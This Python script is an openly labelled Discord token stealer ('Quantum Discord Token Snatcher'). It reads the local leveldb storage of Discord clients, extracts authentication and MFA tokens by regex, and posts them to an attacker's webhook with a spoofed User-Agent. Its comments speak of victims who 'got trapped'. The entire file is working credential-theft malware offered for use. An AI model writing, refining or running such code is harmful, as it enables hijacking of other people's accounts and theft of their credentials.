import os
import re
import json

from urllib.request import Request, urlopen

#_#ENTER YOUR WEBHOOK ADRESS HERE#_# seraphinetruth
WEBHOOK_URL = 'WEBHOOK_URL_HERE'

#_#ENABLE IF YOU WANT MENTION WHEN SOMEONE GOT TRAPPED:D#_# seraphinetruth
PING_ME = False

{
  "avatar_url": "https://i.imgur.com/oBPXx0D.png",
  "content": "Quantum Discord Token Snatcher!"
}

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n> **[Quantum Discord Token Snatcher] - TARGET TOKEN:**\n```\n'
        
        

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += '0 tokens found.. :(\n'

        message += '```'

        message += '[**https://i.imgur.com/9pYvVrv.png**]'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

